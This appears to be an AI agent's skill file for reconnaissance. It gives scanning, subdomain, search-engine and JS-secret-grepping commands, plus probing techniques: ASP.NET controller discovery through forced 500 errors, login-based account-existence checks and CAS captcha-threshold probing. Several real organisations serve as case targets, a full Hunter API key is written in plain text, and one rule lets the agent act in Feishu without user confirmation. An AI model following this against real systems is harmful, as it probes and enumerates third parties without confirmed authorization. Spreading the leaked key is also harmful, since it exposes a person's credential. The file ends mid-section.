---
name: info-gathering
description: "Information gathering & reconnaissance: OSINT, network scanning, DNS enumeration, subdomain discovery, WHOIS, port scanning using dddd & afrog. Covers passive and active recon phases, SPA API discovery, CAS SSO analysis, and JWT/auth flow analysis."
version: 1.16.0
author: c1ayoo
license: MIT
platforms: [linux, macos, wsl]
metadata:
  hermes:
    tags: [cybersecurity, osint, recon, scanning, dddd, afrog, dns, whois, enumeration, fingerprint]
    category: cybersecurity
---

# Information Gathering & Reconnaissance

Comprehensive skill for cybersecurity information gathering, covering both passive and active reconnaissance phases.

## CyberStrikeAI 平台运行规则

- Quake 查询优先使用平台的 **资产管理 → 信息收集 → Quake**，或平台原生 `/api/fofa/search`（`provider=quake`）能力；查询结果通过 `/api/assets/import` 入库。
- Token 只从系统设置的 `quake.api_key` 或进程环境变量 `QUAKE_API_KEY` 读取。禁止把 Token 写入 Skill、PoC、命令示例、对话或导出文件。
- 本文中遗留的 `~/.hermes/tools/quake_query.py` 命令仅作为历史语法示例；在 CyberStrikeAI 中应转换为等价的 Quake DSL 后交给平台执行。
- 对外部目标默认只做被动测绘；只有用户明确要求主动验证并确认授权范围后，才执行 DNS、HTTP、端口或漏洞探测。

**⚠️ 用户偏好：创建/修改 skill 前先展示内容让用户审核，确认后再执行。**

## Content Quality Requirements（重要）

**用户明确要求：信息收集文档内容必须精确，不能宽泛或模糊。**

### 规则
1. **禁止只列清单没有数据** — "使用自定义C2域名、修改默认证书"这种纯描述性列表没有价值，必须包含具体的技术细节
2. **必须包含具体格式/参数/命令** — 如具体的请求格式、加密算法参数、端口号、正则表达式
3. **Suricata/检测规则必须完整** — 不能只说"检测xxx"，要给出完整的规则代码
4. **删除无实际作用的内容** — 只有一段描述、没有具体数据的段落应该删除
5. **作者署名：c1ayoo** — 不是 "Hermes Agent"
6. **命令和代码必须用代码块格式** — 提高可读性
7. **飞书知识库操作（非删除）不需要用户确认** — 直接执行

### 示例（正确 vs 错误）

❌ 错误（太宽泛）：
```
📌 定制版特征
• 自定义 C2 域名和IP
• 自定义 Beacon 配置
• 自定义加密密钥
• 通信协议经过混淆
• 检测难度较高
```

✅ 正确（精确数据）：
```
📌 HTTPS Beacon 精确特征

证书 Subject: CN=Unknown, OU=Unknown, O=Unknown
JA3 指纹: 72a589da586844d7f0818ce684948eea
JA3S: 473cd7cb9faa642487833865d516e578
TLS 版本: TLS 1.2
密码套件: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
```

**核心工具：**
- **dddd-mod** — 二改 dddd，集成 Quake 搜索/JS 逆向/22 国产指纹/WAF 检测/扫描模式控制。详细开发参考 `chinese-enterprise-recon-tooling` skill
- **dddd** - 批量信息收集、供应链漏洞探测（端口扫描 + 漏洞检测）
- **afrog** - PoC漏洞扫描器（基于PoC的漏洞验证）
- **web_fingerprint.py** - Web 指纹识别（60+ 框架/中间件/OA/安全设备指纹，含路径探测）
- **hunter_query.py** - 奇安信 Hunter 搜索引擎 CLI（ip/domain/icp/org/port 查询，30 天窗口，含 OS 识别）
- **ENScan_GO** - 企业信息收集（子公司/ICP备案/APP/公众号/招聘/域名），基于国内企业信息查询API
- **subfinder** - 子域名被动收集
- **amass** - 子域名主动枚举
- **masscan** - 大范围端口扫描（Windows 下由 rustscan 兼容包装器承载）

## 快速场景 Prompt

收到用户请求时，先匹配以下场景，走对应链路，不从头思考：

### 场景 1：单域名全面资产测绘
用户说「看看 example.com」
```
链路：域名→WHOIS→子域名→DNS→IP→端口→指纹→证书→威胁情报
输出：十段报告模板（域名基础信息/DNS/子域名/证书/服务器/指纹/情报/关联资产/风险/来源）
```
走完全链路后套 `references/osint-report-template.md` 输出。

### 场景 2：证书指纹反查关联资产
用户说「通过证书找其他域名」
```
链路：已知域名→openssl 提取证书 SHA256→crt.sh/Censys/Shodan 反查指纹→发现同证书域名
输出：证书信息 + 关联域名列表 + 同主体资产分析
```
详细方法论见 `references/cert-fingerprint-reverse.md`。

### 场景 3：子域名批量收集与存活探测
用户说「把这个域名的子域名全找出来」
```
链路：crt.sh→Quake→DNS解析→HTTP探活→指纹识别→存活列表
输出：子域名 | IP | 状态码 | 标题 | 技术栈 | 风险标记
```
先 crt.sh（免费快速）→ Quake（全面）→ 去重 → 探活 → 指纹。

### 场景 4：IP 段资产测绘
用户说「扫这个 IP 段」
```
链路：IP段→端口扫描(dddd)→服务识别→Web指纹→证书提取→资产关联
输出：按 IP 分组，每个 IP 的开放端口/服务/Banner/归属
```
用 dddd 按 /24 段分批扫描，避免超时。

### 场景 5：企业关联资产挖掘
用户说「查这个公司有哪些资产」
```
链路：企业名→ICP备案→天眼查→域名列表→子域名→证书关联→IP反查→去重汇总
输出：全量资产清单（域名+IP+服务+指纹），标注风险
```
ENScan_GO 查子公司 + ICP 反查 + crt.sh 子域 + 证书关联 + 去重。

### 场景 6：微信公众号文章内容提取
用户说「看下这个微信文章链接」
```
链路：curl 带 Mobile MicroMessenger UA → 绕过反爬 → 提取 og:title/og:description → 提取 JS 变量(公众号名/账号/时间)
输出：文章标题 + 全文 + 公众号信息
```
注意：browser 工具会超时（JS 渲染 >60s），必须用 curl + meta 提取。详见 `references/wechat-article-extraction.md`。

## When to Use

- Security assessments and penetration testing
- Asset discovery and attack surface mapping
- DNS and domain enumeration
- Port scanning and service discovery
- OSINT (Open Source Intelligence) gathering
- Supply chain vulnerability detection

## Prerequisites

```bash
# DNS and OSINT tools
sudo apt update && sudo apt install -y whois dnsutils net-tools curl wget jq masscan

# Subdomain enumeration (optional)
pip install subfinder amass
```

**已安装工具路径：**
```bash
/home/c1ay/.local/bin/dddd    # 批量信息收集
/home/c1ay/.local/bin/afrog   # PoC漏洞扫描
~/.hermes/skills/cybersecurity/info-gathering/scripts/web_fingerprint.py  # Web指纹识别
```

- `references/quake-cli-tool.md` — Quake CLI 工具使用参考
- `references/enterprise-batch-recon.md` — 企业集团资产批量发现（多策略交叉 + CSV 导出）
- `references/dddd-mod-fork-guide.md` — dddd 二开指南（国产资产增强 + 模块架构 + 指纹规则）
- `references/ai-llm-exposed-services.md` — 公网暴露 AI/LLM 服务搜索
- `references/huazhu-enterprise-recon.md` — 华住酒店集团非常规资产侦察案例（Next.js config 提取、隐藏子域名、CORS 通配符、腾讯 COS、501 端点发现）
- `references/frp-server-recon.md` — FRP 服务器识别与信息收集
- `references/afrog-cyberspace-config.md` — afrog 搜索引擎配置
- `references/fingerprint-research.md` — 指纹识别研究笔记
- `references/cve-monitoring-workflow.md` — CVE 漏洞监控工作流
- `references/github-batch-operations.md` — GitHub 批量操作
- `references/enterprise-recon-tools.md` — 企业信息收集工具
- `references/dddd-architecture-analysis.md` — dddd 项目架构分析（Plugin 注册制、协程调度、反射调用、字典模板变量），适用于用户 Fork 二开时理解原作者设计规范
- `references/enterprise-multi-strategy-recon.md` — 中国企业集团多策略资产发现（ENScan_GO 子公司列表 + org/domain/ICP/证书多策略交叉 + 去重导出）
- `references/batch-domain-recon-pattern.md`
- `references/xawl-recon-case-study.md` — 西安文理学院多阶段信息收集案例
- `references/taiwan-webapp-pentesting.md` — 台湾学校/政府网站渗透测试模式（XOOPS CMS + tad模块 + ASP+Big5 + cPanel主机）
- `references/taiwan-legacy-php-assessment.md` — 台湾企业旧版 PHP 系统评估案例（Apache 2.2 + PHP 5.2 + MySQL 5.0 + phpMyAdmin 2.10）
- `references/phoenix-recon-pattern.md` — Phoenix Recon：域名无 A 记录时通过 Quake 历史数据发现源站 IP 和服务指纹
- `references/dddd-architecture-analysis.md` — dddd 项目架构分析（Plugin 注册制、协程调度、反射调用、字典模板变量），适用于用户 Fork 二开时理解原作者设计规范
- `references/dddd-mod-guide.md` — dddd-mod 二开完整指南（Quake 搜索/JS 逆向/22 国产指纹/WAF 检测/扫描模式控制/工作流集成点）
- `references/dddd-mod-china-enterprise-extensions.md` — dddd 二开：国产企业资产发现增强（Quake 搜索/JS 逆向/国产系统指纹）
- `references/enterprise-quake-multistrategy.md` — 中国企业集团 Quake 多策略资产发现（五策略交叉）
- `references/vue-spa-deep-analysis.md` — Vue SPA 深度源码分析
- `references/spa-api-discovery.md` — SPA API 发现技术（基础篇）
- `references/spa-vue-auth-flow-analysis.md` — Vue SPA 认证流完整分析
- `references/cas-login-automation.md` — CAS 自动化登录完整流程
- `references/spring-oauth2-discovery.md` — Spring OAuth2 Authorization Server 发现与端点枚举（含跨主机 Swagger 发现方法论）
- `references/aspnet-mvc-recon.md` — ASP.NET MVC 控制器发现（通过 500 错误泄露）与 Unionsoft 框架端点枚举
- `feishu-wiki-management` — 飞书云文档创建和权限管理（CVE 报告可自动写入文档）
- `references/linux-find-writable-dirs.md` — Linux 可写目录查找（RedTail 实战技术，攻防双视角）
- `references/passive-detection-patterns.md` — 渗透测试被动检测规则（YAKIT 59 条规则整理 + 53 条扩展 + Shiro/Struts2/JSONP/SourceMap/调试参数方法论）
- `references/yakit-traffic-rules.json` — YAKIT 流量检测规则原始 JSON（59 条正则规则）
- `references/osint-report-template.md` — OSINT 资产侦察十段报告模板
- `references/cert-fingerprint-reverse.md` — 证书指纹反查关联资产方法论
- `references/threat-intel-free-sources.md` — 免费威胁情报源整合（Shodan InternetDB / OTX / AbuseIPDB）
- `references/woniuxy-recon-case-study.md` — ICP反查40+域名/Nacos/KodExplorer/Tomcat
- `references/szqinlv-recon-pattern.md` — 过期域名+泛解析Wildcard子域名(20+站点)- `references/minio-s3-detection.md` — MinIO/S3 存储后端检测（X-Amz 指纹/Bucket枚举/Cloudflare 源站暴露）
- `references/redtail-dropper-analysis.md` — RedTail 挖矿僵尸网络 Dropper 分析（find 可写目录技巧、noexec 排除、空间验证、C2 识别模式）
- `references/cdn-fingerprint-byteDance-tencent.md` — 字节跳动/腾讯云 CDN 指纹识别（Lego Server / X-Tt-* 头 / TencentEdgeOne）
- `references/multi-port-service-chain-discovery.md` — 多端口服务链发现（Voice Agent API SSRF + ASP.NET MVC 内部 API 链）
- `references/minio-s3-storage-recon.md` — MinIO / S3 存储后端探测（X-Amz 指纹、Bucket 枚举、MinIO 部署模式识别、Console 端口探测、匿名访问测试）
- `references/qwen-playwright-automation.md` — 千问 Playwright 浏览器自动化（免费 AI 视觉分析/文本对话，showOpenFilePicker 拦截，扫码登录流程）
- `references/wechat-article-extraction.md` — 微信公众号文章内容提取（绕过反爬 + og:description 提取全文 + 公众号信息）

## ENScan_GO 企业信息收集

ENScan_GO 是基于国内企业信息查询API的工具，可收集企业关联信息。

```bash
# 安装
go install github.com/wgpsec/ENScan_GO@latest

# 查询企业信息
enscan -n 公司名称

# 查询子公司
enscan -n 公司名称 -invest

# 查询ICP备案
enscan -n 公司名称 -icp

# 查询APP
enscan -n 公司名称 -app

# 查询微信公众号
enscan -n 公司名称 -wechat

# 查询招聘岗位
enscan -n 公司名称 -job

# 深度查询（包含子公司）
enscan -n 公司名称 -deep

# 输出JSON格式
enscan -n 公司名称 -o json
```

**详细用法参考：** `references/enterprise-recon-tools.md`
**安装与配置：** `references/enscan-setup.md`
**安装与配置：** `references/enscan-setup.md`

## Passive Reconnaissance

### 1. WHOIS Lookup

```bash
# Basic WHOIS
whois example.com

# Extract key info
whois example.com | grep -E "Registrar|Name Server|Creation Date|Registry Domain ID"
```

### 2. DNS Enumeration

```bash
# A records
dig example.com A +short

# AAAA records (IPv6)
dig example.com AAAA +short

# MX records (mail servers)
dig example.com MX +short

# NS records (name servers)
dig example.com NS +short

# TXT records (SPF, DKIM, etc.)
dig example.com TXT +short

# SOA record
dig example.com SOA +short

# Reverse DNS
dig -x 192.168.1.1

# DNS zone transfer attempt
dig axfr example.com @ns1.example.com

# All records
dig example.com ANY +noall +answer
```

### 3. Subdomain Discovery

```bash
# Using subfinder
subfinder -d example.com -o subdomains.txt

# Using amass (passive mode)
amass enum -passive -d example.com -o amass_subs.txt

# Certificate Transparency logs
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u

# DNS brute force
for sub in www mail ftp admin test dev staging api; do
  dig +short $sub.example.com | grep -v "^$" && echo "Found: $sub.example.com"
done
```

### 4. IP and ASN Information

```bash
# IP to ASN lookup
whois -h whois.cymru.com " -v 8.8.8.8"

# ASN to IP ranges
whois -h whois.radb.net -- '-i origin AS15169' | grep route
```

## Active Reconnaissance

### 1. Port Scanning with dddd / dddd-mod

**本机使用 c1ayoo 二改版 dddd-mod（`~/dddd-mod/`），非原版 dddd。** dddd-mod 增加了扫描模式、搜索引擎集成、JS 逆向、国产系统指纹等能力。以下命令以 dddd-mod 为准。

#### 基础用法（原版兼容）

```bash
# Quick scan (default top 1000 ports)
./dddd -t target.com

# Full port scan
./dddd -t target.com -p 1-65535

# TCP scan with custom threads
./dddd -t target.com -st tcp -tst 4000

# SYN/快速端口发现（Linux 可用原生 masscan；Windows 使用 masscan 兼容包装器）
./dddd -t target.com -st syn -sst 10000

# Scan specific ports
./dddd -t target.com -p 80,443,22,21,3306,6379

# Scan from file (one target per line)
./dddd -t targets.txt

# Scan IP range
./dddd -t 192.168.1.0/24

# Scan with IP:port format
./dddd -t 192.168.1.1:80,443

# Disable host discovery
./dddd -t target.com -Pn

# Output results
./dddd -t target.com -o results.txt
```

#### dddd-mod 增强命令（c1ayoo 二改）

```bash
# 扫描模式控制（--mode / -m，c1ayoo 二改特性）
# light（默认）：端口+指纹+探活，避开 WAF
# normal：light + 目录爆破 + JS 逆向
# full：normal + nuclei PoC + GoPoC 弱口令爆破
./dddd -t target.com -m light
./dddd -t target.com -m normal
./dddd -t target.com -m full

# Quake 搜索引擎集成（--quake / -qk）
./dddd -t target.com --quake --qk "YOUR_KEY" -m normal

# JS 逆向分析（config.js / __NEXT_DATA__ / RSA 公钥提取）
./dddd -t target.com --jsrecon -m normal

# 国产系统资产增强（17 非标端口 + 22 条路径 + 22 个系统指纹）
./dddd -t target.com --cnasset -m normal

# 传统企业场景：重指纹 + 国产系统
./dddd -t target.com --quake --qk "$KEY" -m normal --cnasset --jsrecon --no-nmap

# IT 教育/SPA 站点：重 JS 逆向
./dddd -t target.com --quake --qk "$KEY" -m normal --jsrecon --no-nmap

# WAF 边缘节点：只 dry-run 看资产清单
./dddd -t target.com --quake --qk "$KEY" --skip-waf --dry-run

# Dry-run 模式（只打印执行计划，不实际扫描）
./dddd -t target.com --quake --qk "$KEY" -m normal --dry-run

# 带 explain 的 dry-run（每步输出原因）
./dddd -t target.com --quake --qk "$KEY" -m normal --dry-run --explain

# 跳过 gonmap 协议识别（减少噪音）
./dddd -t target.com --no-nmap

# 跳过 WAF 检测
./dddd -t target.com --skip-waf
```

**dddd-mod 增强参数（c1ayoo 二改）：**
```bash
-m, --mode string         扫描模式: light(默认)/normal/full
--quake                   启用 Quake 搜索引擎
-qk, --quake-key string   Quake API Key
--jsrecon                 JS 逆向分析（config.js/__NEXT_DATA__/RSA）
--cnasset                 国产系统资产增强（端口+路径+指纹）
--dry-run                 只打印执行计划，不执行扫描
--explain                 每步输出执行原因（配合 --dry-run）
--skip-waf                跳过 WAF 检测
--no-nmap                 跳过 gonmap 协议识别
```

**原版 dddd 端口扫描参数：**
```bash
-p, -port string              端口设置，默认扫描Top1000
-st, -scan-type string        扫描方式: "tcp" 或 "syn" (默认tcp)
-tst, -tcp-scan-threads int   TCP扫描线程 (Linux默认4000)
-sst, -syn-scan-threads int   SYN扫描线程 (默认10000)
-mp, -masscan-path string     masscan程序路径
-pmc, -ports-max-count int    IP端口数量阈值 (默认300)
-pst, -port-scan-timeout int  TCP端口扫描超时(秒) (默认6)
```

### 2. Vulnerability Scanning with afrog

```bash
# Scan single target
afrog -t https://target.com

# Scan multiple targets
afrog -t https://target1.com,https://target2.com

# Scan from file
afrog -T targets.txt

# Search PoCs by keyword
afrog -t target.com -s tomcat,phpinfo

# Filter by severity
afrog -t target.com -S high,critical

# Use specific PoC file or directory
afrog -t target.com -P /path/to/pocs/

# Exclude specific PoCs
afrog -t target.com -ep CVE-2021-xxxx

# Show PoC list
afrog -pl

# Show PoC details
afrog -pd CVE-2021-xxxx

# Cyberspace search (ZoomEye ONLY - see pitfalls)
afrog -cs zoomeye -q "app:'tomcat'" -qc 1000

# Resume scan
afrog -resume resume.afg

# Output results
afrog -t target.com -o results.html
```

**afrog 扫描参数：**
```bash
-t, -target string[]          目标URL/主机
-T, -target-file string       目标文件
-s, -search string            按关键词搜索PoC
-S, -severity string          按严重级别过滤: info, low, medium, high, critical
-P, -poc-file string          指定PoC文件或目录
-ep, -exclude-pocs string[]   排除的PoC
-cs, -cyberspace string       空间搜索引擎 (仅支持 zoomeye)
-q, -query string             搜索关键词
-qc, -query-count int         搜索结果数量 (默认100)
-config string                指定配置文件路径 (默认 ~/.config/afrog/afrog-config.yaml)
```

## ASP.NET MVC 网站信息收集

ASP.NET MVC 网站有独特的指纹特征和信息收集方法，特别是通过**故意触发 500 错误**来发现控制器。

### 快速识别

```bash
# 1. 检查响应头（可能被 nginx 隐藏）
curl -skI "https://target.com/" | grep -i "x-aspnet-version\|x-powered-by"
# X-AspNet-Version: 4.0.30319 → ASP.NET 4.x

# 2. 查看 CSRF Token 判断 ASP.NET MVC
curl -sk "https://target.com/" | grep -oP '__RequestVerificationToken'
# 存在 → ASP.NET MVC（非 WebForms）

# 3. 检查 login 页面 JS 中的路由模式
curl -sk "https://target.com/" | grep -oP 'url:[^,]+'
# url: "/Login/CheckLogin" → {controller}/{action} 路由

# 4. 探测 IIS 版本（通过 web.config 404.8 错误）
curl -sk "https://target.com/web.config" | grep -oP "IIS \d+\.\d+"
# IIS 7.5  → Windows Server 2008 R2
# IIS 8.5  → Windows Server 2012 R2
# IIS 10.0 → Windows Server 2016/2019
```

### 控制器发现（核心技术）

通过访问 `/ControllerName/ControllerName` 触发 **500 路由冲突错误**，泄露完整控制器列表：

```bash
# 触发 500 错误暴露控制器名
curl -sk "https://target.com/User/User"
# 响应:
#   Multiple types were found that match the controller named 'User'.
#   The request for 'User' has found the following matching controllers:
#   Unionsoft.Web.Areas.Sys.Controllers.UserController
#   Unionsoft.Platform.Web.Areas.Sys.Controllers.UserController

# 批量探测控制器是否存在
for ctrl in Home Login Account User Workflow Flow Admin System; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com/${ctrl}/${ctrl}")
  [ "$code" = "500" ] && echo "✅ $ctrl 存在 (500)"
  [ "$code" = "200" ] && echo "🟡 $ctrl 存在 (200)"
done
```

**详细方法论与案例：** `references/aspnet-mvc-recon.md`

### 数据接口发现

控制器存在后，枚举可能的动作方法：

```bash
# 数据接口常见动作
for action in GetList GetData GetPage List Index Search Query; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com/User/${action}")
  [ "$code" != "404" ] && echo "${code} /User/${action}"
done

# 状态码解读
# 500 → 方法存在（参数缺失或认证失败）
# 200 + JSON → 免认证接口
# 200 + 登录页 → 需认证
```

### 登录端点分析

```bash
# 获取 CSRF Token
TOKEN=*** -sk "https://target.com/" | grep -oP '__RequestVerificationToken.*?value="\K[^"]+')

# 判断账户是否存在
curl -sk -X POST -d "username=target&password=hash&verifycode=&p=test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "__RequestVerificationToken: $TOKEN" \
  "https://target.com/Login/CheckLogin"
# "密码和账户名不匹配!" → 账户存在
# "账户不存在!" → 账户不存在或注入被参数化拦截
```

## 空间搜索引擎

### afrog 仅支持 ZoomEye

⚠️ **afrog v3.5.3 仅支持 ZoomEye**（源码验证）。`-cs quake/fofa/shodan` 参数虽然被 CLI 接受，但后端未实现，会永远报 "api key is empty"。

配置文件 `~/.config/afrog/afrog-config.yaml`：
```yaml
cyberspace:
  zoom_eyes:
    - "your_zoomeye_api_key_here"
```

### Hunter API 查询（奇安信，2026-08 新增）

本地已安装 CLI 工具 `hunter_query.py`（路径 `~/.hermes/tools/`），使用奇安信 Hunter 搜索引擎。

**API key**：`0e16ca8078c62dfe93215f893aaf7da78a7d165ea5edfd508aa23d8ddb8fb7db`（用户提供，2026-08）

```bash
# ⭐ 首选 CLI 工具
python3 ~/.hermes/tools/hunter_query.py --ip 1.2.3.4
python3 ~/.hermes/tools/hunter_query.py --ip 1.2.3.4 --all        # 全部协议(含非web)
python3 ~/.hermes/tools/hunter_query.py --domain target.com
python3 ~/.hermes/tools/hunter_query.py --icp "蜀ICP备15014130"
python3 ~/.hermes/tools/hunter_query.py --org "公司名称"
python3 ~/.hermes/tools/hunter_query.py --search 'ip="1.2.3.4" AND port="5003"'
python3 ~/.hermes/tools/hunter_query.py --search 'domain="target.com" AND port="8080"'
python3 ~/.hermes/tools/hunter_query.py --days 7    # 时间窗口(默认30天)
```

**Hunter API 要点：**
- **API 端点**：`https://hunter.qianxin.com/openApi/search`
- **search 参数**：查询语句需 **URL-safe Base64** 编码（非标准 base64）
- **时间范围**：**仅支持近 30 天**（超出报错「当前时间范围超出近30天」；30 天内免费）
- **is_web 参数**：3=只查 web 服务（默认），0=全部协议（查端口用 --all）
- **限流**：连续请求会 429「请求太多啦」——每次查询间隔 3-5 秒
- **返回字段**：ip/port/protocol/web_title/domain/company/os——比 Quake 多 OS 识别
- **优势**：中文公司字段准确（org 查询对国内目标友好）；端口精确查询 `port="5003"`

**典型场景：**
```bash
# 精确查某 IP 的某端口（如 5003）
python3 ~/.hermes/tools/hunter_query.py --search 'ip="120.53.251.211" AND port="5003"' --all

# 查域名全资产
python3 ~/.hermes/tools/hunter_query.py --domain woniuxy.com

# 查 ICP 关联域名
python3 ~/.hermes/tools/hunter_query.py --icp "蜀ICP备15014130"

# 多引擎交叉验证（Quake + Hunter 结果合并去重）
python3 ~/.hermes/tools/quake_query.py --domain target.com --format compact
python3 ~/.hermes/tools/hunter_query.py --domain target.com
```

**⚠️ Hunter vs Quake 差异：**
- Hunter 30 天窗口 vs Quake 全历史——Hunter 只能看近期，Quake 有历史资产
- Hunter 有 OS 识别（os 字段）、Quake 无
- Hunter 精确端口查询更友好（`port="5003"`），Quake 端口过滤不可用
- 两者**互补**：历史资产用 Quake，近期存活用 Hunter

### Quake API 查询（平台原生能力优先）

在“资产管理 → 信息收集”选择 Quake，输入 Quake DSL，执行查询后勾选结果并点击“入库所选”。程序由后端读取密钥，浏览器和导出文件不会拿到 Token。详细用法见 `references/quake-cli-tool.md`。

```text
domain:"target.com"
ip:"1.2.3.4"
icp:"京ICP备010000号"
cve:"CVE-2024-XXXXX"
org:"公司名称"
service.http.title:"nginx"
```

**Quake API 注意事项（平台后端已处理）：**
- API 域名：`quake.360.net`（非 `quake.360.cn`，后者 308 重定向）
- 认证头：`X-QuakeToken`
- 字段名：不支持 `service.port` 等细粒度过滤，只用 `query` 参数
- 结果需先校验属于授权范围，再从资产管理导出或交给后续流程

### ICP 备案号反查资产（中国站点核心技巧）

**SOUL 3.10 强制要求：信息收集必须包含 ICP 备案提取。**详见 SOUL 第3章。

中国网站的 ICP 备案号（工信部备案）是**将同一主体下的所有域名关联起来的最强手段**。一个公司可能有多个独立域名（主站/商城/博客/教育平台/内部系统），但通常都挂在同一 ICP 备案号下。

**提取流程：**
1. **首页 Footer** → 查看页面底部 ICP 号（`京ICP备XXXXXX号` / `粤B2-XXXXXX号`）
2. **备用来源** → 关于我们页 → 营业执照公示页 → HTML 源码搜 `beian`
3. **web_search 补全** → 若页面无显示，搜索"目标域名 ICP 备案"

**注册人信息查询（必须获取）：**
- 主办单位名称、性质（企业/政府/个人）
- 网站名称、域名、审核时间、备案号
- 渠道：工信部备案系统 API / 第三方 ICP 查询 / web_search 交叉验证

**Quake 关联检索：**
```sql
icp:"京ICP备XXXXXX号"
org:"主办单位全称"
```
记录：关联域名数、IP 数、端口分布、主要服务类型。

**文档输出要求：** 归档到 1.1/1.2 时在"执行流程"中增加"ICP 备案溯源"小节。

**流程：**
```
官网首页 → grep ICP 备案号 → Quake 搜 ICP → 发现全部关联域名
```

```bash
# 1. 从网站首页提取 ICP 备案号
curl -skL --connect-timeout 10 "https://target.com" | grep -iP 'icp|备案|beian'
# 结果: 蜀ICP备15014130号-2

# 2. Quake 搜索同 ICP 的所有域名
curl -s --connect-timeout 15 -X POST "https://quake.360.net/api/v3/search/quake_service" \
  -H "Content-Type: application/json" \
  -H "X-QuakeToken: YOUR_QUAKE_KEY" \
  -d '{"query": "icp: \"备案号前半部分\"", "start": 0, "size": 200}'

# 3. 对比分析 — 同一个 ICP 下的域名可能是完全不同的业务系统
```

**注意：** ICP 号格式为 `省简称ICP备XXXXXX号-N`，Quake 搜索时只匹配前半部分（如 `蜀ICP备15014130` 不包含 `-N` 后缀）。多站点可能共用同一 ICP 母号但不同子号（`-1`、`-2`）。

**⚠️ Quake ICP 反查限制：** Quake 按 ICP 检索返回的条目中，`hostname` 字段经常为空（仅显示 IP 和端口），无法直接获取域名列表。需结合 crt.sh 证书透明度日志或 DNS 枚举来补齐域名。仅靠 Quake ICP 查询不足以发现子公司全部域名。

### Quake 企业集团批量资产发现（多策略交叉）

中国大型企业集团旗下有几十家子公司，各自有独立域名和 IP 段。需要多策略交叉搜索：

**策略一：按组织名称搜索**
```bash
python3 ~/.hermes/tools/quake_query.py --search 'org:"浙能"' --size 100
python3 ~/.hermes/tools/quake_query.py --search 'org:"浙江浙能"' --size 100
```

**策略二：按域名搜**
```bash
python3 ~/.hermes/tools/quake_query.py --domain "zheneng.com"
python3 ~/.hermes/tools/quake_query.py --domain "zjenergy.com.cn"
```

**策略三：按 ICP 备案号搜**
```bash
python3 ~/.hermes/tools/quake_query.py --icp "浙B2-xxxxxx"
```

**策略四：子公司逐一搜**
```bash
for org in "浙能电力" "浙能数科" "浙能燃气"; do
  python3 ~/.hermes/tools/quake_query.py --search "org:\"${org}\"" --size 50
done
```

**策略五：CSV 导出（去重后用 utf-8-sig 编码，Excel 直接打开）**
- 合并多次查询结果，去重 key=`IP:端口`
- 写 CSV 时用 `utf-8-sig` 编码（带 BOM 头），Excel 可直接识别中文
- 包含列：IP、端口、主机名、所属机构、来源查询

**策略六：交叉推断**
- 同一 IP 在不同查询中出现 → 大概率属于目标
- 不同 IP 但在同一 /24 段 + 相同云厂商 → 可能同属一个集团
- Quake 对中文企业的 org 字段常缺失（仅显示"Alibaba Cloud"），不要仅靠 org 判断归属

**实战案例：** 蜗牛学院(woniuxy.com) 从 `蜀ICP备15014130号-2` 反查出 40+ 关联域名，含 Nacos 配置中心、BOSS 系统、网安实验室。见 `references/woniuxy-recon-case-study.md`。

### 其他搜索引擎（curl 直接调用）

```bash
# FOFA  
curl -s "https://fofa.info/api/v1/search/all?email=EMAIL&key=KEY&qbase64=$(echo -n 'app="tomcat"' | base64)" | jq '.results[]'

# Shodan（需 API Key）
curl -s "https://api.shodan.io/shodan/host/search?key=KEY&query=app:tomcat" | jq '.matches[].ip_str'

# Shodan InternetDB（无需 API Key，快速被动收集域名和端口信息）
curl -s "https://internetdb.shodan.io/1.2.3.4"
```

### 5. SPA config.js / JS 源码分析

Vue.js/React SPA 常在根目录暴露 `config.js`，其中硬编码 API 地址、token、企业微信 appid 等敏感信息。

```bash
# 读取 config.js（如存在）
curl -s -k --connect-timeout 5 https://target.com/config.js

# 典型泄露内容：
# window.g = {
#   baseUrl: window.location.origin,
#   token: "<REPLACE_WITH_TOKEN>",  // 硬编码 token
#   appid: "<REPLACE_WITH_APP_ID>",                 // 企业微信 appid
#   agentid: "<REPLACE_WITH_AGENT_ID>",
# }

# JS 中搜索 API 端点
curl -s -k --connect-timeout 5 https://target.com/static/js/app.xxx.js | \
  grep -oP '/[a-z_]+/[a-z_/]+/[a-z_]+' | sort -u | head -30

# JS 中搜索硬编码凭据
curl -s -k --connect-timeout 5 https://target.com/static/js/app.xxx.js | \
  grep -oP '(password|username|secret|apikey|apiKey|token)[^,}"]+' | head -20

# JS 中搜索内部地址
curl -s -k --connect-timeout 5 https://target.com/static/js/app.xxx.js | \
  grep -oP '"https?://[^"]+"' | sort -u
```

### 6. CAS / SSO 系统识别与分析

高校和企业常见使用 CAS（Central Authentication Service）做统一登录。

**识别方法：**
```bash
# 从 JS 或登录页发现 CAS 集成
# 特征：URL 中包含 /cas/login?service= 
# 典型端点：cas.xawl.edu.cn/cas/login

# 检测 CAS 版本（通过 serviceValidate 接口）
curl -s -k "https://cas.target.edu.cn/cas/serviceValidate?service=http://localhost&ticket=ST-xxx"
# 标准 CAS 返回 XML：
# <cas:serviceResponse>
#   <cas:authenticationFailure code='...'>
#   </cas:authenticationFailure>
# </cas:serviceResponse>

# 探测 CAS 表单字段
curl -s -k https://cas.target.edu.cn/cas/login | \
  grep -oP '<input[^>]*name="([^"]*)"[^>]*' | \
  grep -oP 'name="([^"]*)"'
# 典型字段：username, password, imageCodeName, lt, _eventId, rememberMe
```

**CAS 自动化登录完整流程：** `references/cas-login-automation.md`
- 含 Python 代码：获取 lt → 判断验证码 → RSA 加密密码 → POST 登录 → 提取 ticket → 验证
- 表单字段说明、常见端点、Pitfalls
- 服务 URL 模式对比（`j_spring_cas_security_check` vs `/cas/login` 两种模式）
- 以 xawl.edu.cn CAS 为例

**CAS 验证码行为分析：**
```bash
# 验证码可能默认隐藏（登录失败后才出现）
# 检查页面中是否有：
# <tr id="imageCode" style="display:none;">
# <input id="errors" name="errors" type="hidden" value="0" />
# 如果 errors 累加至阈值后 display:none 取消 → 前 N 次尝试无验证码

# 验证码图片 URL
# 常见：/cas/codeimage, /datawarn/codeimage
```

**JWT Token 分析（从 API 响应获取）：**
```python
# 从 intercepted API 响应中解码 JWT
import base64, json

def decode_jwt(token):
    parts = token.split('.')
    if len(parts) != 3:
        return None
    def b64d(s):
        s = s + '=' * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(s)
    header = json.loads(b64d(parts[0]))
    payload = json.loads(b64d(parts[1]))
    return header, payload

# 分析要点：
